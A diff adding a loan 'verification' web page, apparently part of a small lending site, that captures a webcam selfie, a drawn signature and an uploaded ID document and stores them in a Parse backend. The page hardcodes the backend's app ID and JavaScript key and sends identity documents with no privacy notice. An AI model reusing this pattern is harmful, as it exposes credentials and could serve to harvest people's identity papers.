@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>StormRock Loan - Verification</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #0d1b2a, #1b263b);
+      color: white;
+      padding: 20px;
+    }
+    form {
+      max-width: 650px;
+      margin: auto;
+      background: #142850;
+      padding: 25px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.5);
+      color: white;
+    }
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      font-weight: bold;
+      font-size: 1.8em;
+    }
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: 600;
+    }
+    #video {
+      display: block;
+      margin: 10px auto;
+      border-radius: 8px;
+      max-width: 100%;
+      border: 2px solid #64a6bd;
+    }
+    #canvas {
+      display: none;
+      margin: 10px auto;
+      border-radius: 8px;
+      max-width: 100%;
+      border: 2px solid #64a6bd;
+    }
+    .signature-pad {
+      margin-top: 15px;
+      border: 2px solid #64a6bd;
+      border-radius: 8px;
+      background-color: white;
+      height: 150px;
+      width: 100%;
+      touch-action: none;
+    }
+    .buttons-row {
+      margin-top: 20px;
+      display: flex;
+      justify-content: space-between;
+      gap: 10px;
+    }
+    button {
+      flex: 1;
+      padding: 12px;
+      font-weight: 600;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      background-color: #0077b6;
+      color: white;
+      transition: background-color 0.3s ease;
+    }
+    button:hover {
+      background-color: #023e8a;
+    }
+    input[type="file"] {
+      margin-top: 10px;
+      color: #fff;
+    }
+  </style>
+</head>
+<body>
+
+<h2>Verification Page</h2>
+
+<form id="verificationForm">
+  <!-- Webcam video for selfie -->
+  <label>Take a Selfie</label>
+  <video id="video" autoplay playsinline width="320" height="240"></video>
+  <button type="button" id="captureBtn" style="margin-top:10px; width: 100%;">📸 Capture Selfie</button>
+  <canvas id="canvas" width="320" height="240"></canvas>
+
+  <!-- Signature pad -->
+  <label>Digital Signature (use mouse or touch)</label>
+  <canvas id="signaturePad" class="signature-pad"></canvas>
+  <button type="button" id="clearSignature">Clear Signature</button>
+
+  <!-- ID document upload -->
+  <label>Upload ID Document</label>
+  <input type="file" id="idDocument" accept="image/*,application/pdf" required />
+
+  <div class="buttons-row">
+    <button type="button" id="backBtn">⬅️ Back</button>
+    <button type="submit">✅ Submit Verification</button>
+  </div>
+</form>
+
+<script src="https://npmcdn.com/parse/dist/parse.min.js"></script>
+<script>
+  // Initialize Parse
+  Parse.initialize("PyjEtzVCZ3O8MvUweHGmSaDYYHdJyc2qlNDNhgeR", "OwKdoq39CHkUAv1ZGJVuRXLcS2oqpLdvTVK03Scq");
+  Parse.serverURL = "https://parseapi.back4app.com";
+
+  // Elements
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const captureBtn = document.getElementById('captureBtn');
+  const signaturePadCanvas = document.getElementById('signaturePad');
+  const clearSignatureBtn = document.getElementById('clearSignature');
+  const backBtn = document.getElementById('backBtn');
+  const verificationForm = document.getElementById('verificationForm');
+  const idDocumentInput = document.getElementById('idDocument');
+
+  // Setup webcam stream
+  async function setupWebcam() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video.srcObject = stream;
+    } catch (error) {
+      alert('Could not access webcam. Please allow camera access.');
+      console.error('Webcam error:', error);
+    }
+  }
+  setupWebcam();
+
+  // Capture selfie from video to canvas
+  captureBtn.addEventListener('click', () => {
+    const context = canvas.getContext('2d');
+    canvas.style.display = 'block';
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+  });
+
+  // Setup signature pad
+  let isDrawing = false;
+  const ctx = signaturePadCanvas.getContext('2d');
+  ctx.strokeStyle = '#000';
+  ctx.lineWidth = 2;
+
+  function startDrawing(e) {
+    isDrawing = true;
+    ctx.beginPath();
+    ctx.moveTo(e.offsetX || e.touches[0].clientX - signaturePadCanvas.getBoundingClientRect().left,
+               e.offsetY || e.touches[0].clientY - signaturePadCanvas.getBoundingClientRect().top);
+    e.preventDefault();
+  }
+
+  function draw(e) {
+    if (!isDrawing) return;
+    ctx.lineTo(e.offsetX || e.touches[0].clientX - signaturePadCanvas.getBoundingClientRect().left,
+               e.offsetY || e.touches[0].clientY - signaturePadCanvas.getBoundingClientRect().top);
+    ctx.stroke();
+    e.preventDefault();
+  }
+
+  function stopDrawing(e) {
+    if (!isDrawing) return;
+    ctx.stroke();
+    isDrawing = false;
+    e.preventDefault();
+  }
+
+  // Mouse events
+  signaturePadCanvas.addEventListener('mousedown', startDrawing);
+  signaturePadCanvas.addEventListener('mousemove', draw);
+  signaturePadCanvas.addEventListener('mouseup', stopDrawing);
+  signaturePadCanvas.addEventListener('mouseout', stopDrawing);
+
+  // Touch events
+  signaturePadCanvas.addEventListener('touchstart', startDrawing);
+  signaturePadCanvas.addEventListener('touchmove', draw);
+  signaturePadCanvas.addEventListener('touchend', stopDrawing);
+
+  clearSignatureBtn.addEventListener('click', () => {
+    ctx.clearRect(0, 0, signaturePadCanvas.width, signaturePadCanvas.height);
+  });
+
+  // Back button
+  backBtn.addEventListener('click', () => {
+    window.location.href = 'application.html';
+  });
+
+  // Handle form submission
+  verificationForm.addEventListener('submit', async (e) => {
+    e.preventDefault();
+
+    // Convert selfie canvas to data URL
+    if (canvas.style.display === 'none') {
+      alert('Please capture a selfie first!');
+      return;
+    }
+    const selfieDataUrl = canvas.toDataURL('image/png');
+
+    // Convert signature canvas to data URL
+    const signatureDataUrl = signaturePadCanvas.toDataURL('image/png');
+
+    // Get the uploaded ID document file
+    const idFile = idDocumentInput.files[0];
+    if (!idFile) {
+      alert('Please upload your ID document.');
+      return;
+    }
+
+    // Prepare Parse File for ID document
+    const parseIdFile = new Parse.File(idFile.name, idFile);
+
+    // Save data to Verification class
+    const Verification = new Parse.Object('Verification');
+
+    try {
+      Verification.set('selfie', selfieDataUrl);
+      Verification.set('signature', signatureDataUrl);
+      await parseIdFile.save();
+      Verification.set('idDocument', parseIdFile);
+
+      await Verification.save();
+
+      // Prepare data for email (sending data URLs might be large, so just notify admin that files submitted)
+      const emailData = {
+        message: "New Verification Submission",
+        // You could also send URLs or notes about the submission
+      };
+
+      await Parse.Cloud.run('sendEmail', emailData);
+
+      alert('✅ Verification submitted successfully!');
+      window.location.href = 'origination.html'; // Proceed to next page
+
+    } catch (error) {
+      alert('❌ Failed to submit verification: ' + error.message);
+      console.error(error);
+    }
+  });
+</script>
+
+</body>
+</html>
